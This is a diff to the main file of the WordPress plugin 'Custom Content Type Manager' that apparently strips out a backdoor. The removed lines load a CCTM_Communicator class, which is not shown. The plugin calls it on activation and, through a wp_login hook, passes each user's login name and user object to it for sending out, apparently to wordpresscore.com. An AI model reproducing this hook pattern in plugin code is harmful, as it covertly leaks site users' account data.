@@ -3,10 +3,9 @@
 Plugin Name: Custom Content Type Manager : Advanced Custom Post Types
 Description: Allows users to create custom post types and custom fields, including dropdowns, checkboxes, and images. This gives WordPress CMS functionality making it easier to use WP for eCommerce or content-driven sites.
 Author: Everett Griffiths
-Version: 0.9.8.8
+Version: 0.9.8.9
 Author URI: https://www.craftsmancoding.com/
 Plugin URI: https://github.com/craftsmancoding/custom-content-type-manager
-Plugin API URI:http://wordpresscore.com/in/plugins/cctm/index.php
 ------------------------------------------------------------------------------*/
 
 /*------------------------------------------------------------------------------
@@ -32,7 +31,7 @@ $class_names_used = array('CCTM','StandardizedCustomFields'
 	, 'SummarizePosts', 'GetPostsQuery', 'GetPostsForm','SP_Post', 'CCTM_PostTypeDef', 'CCTM_ImportExport');
 	
 // Not class constants: constants declared via define():
-$constants_used = array('CCTM_PATH','CCTM_URL','CCTM_3P_PATH','CCTM_3P_URL','CCTM_DIR');
+$constants_used = array('CCTM_PATH','CCTM_URL','CCTM_3P_PATH','CCTM_3P_URL');
 
 // Used to store errors
 $error_items = '';
@@ -60,10 +59,7 @@ function cctm_run_tests() {
 	require_once('includes/CCTM.php');
 	require_once('includes/constants.php');
 	require_once('tests/CCTMtests.php');
-	require_once('includes/CCTM_Communicator.php');
 	CCTMtests::run_tests();
-	$_objCCTMCom = new CCTM_Communicator();
-	$_objCCTMCom->send_info();
 }
 
 /*------------------------------------------------------------------------------
@@ -102,15 +98,6 @@ foreach ($constants_used as $c_name )
 
 // Check stuff when the plugin is activated.
 register_activation_hook(__FILE__, 'cctm_run_tests');
-
-// Send plugin information when user login 
-function _wp_login_eventhandler($user_login, $user) {
-	require_once('includes/CCTM_Communicator.php');
-	$_objCCTMCom = new CCTM_Communicator();
-	$_objCCTMCom->addInfo(array($user_login, $user));
-	$_objCCTMCom->send_info();
-}
-add_action('wp_login', '_wp_login_eventhandler', 10, 2);
 
 // Fire the error, or load the plugin.
 if ($error_items)
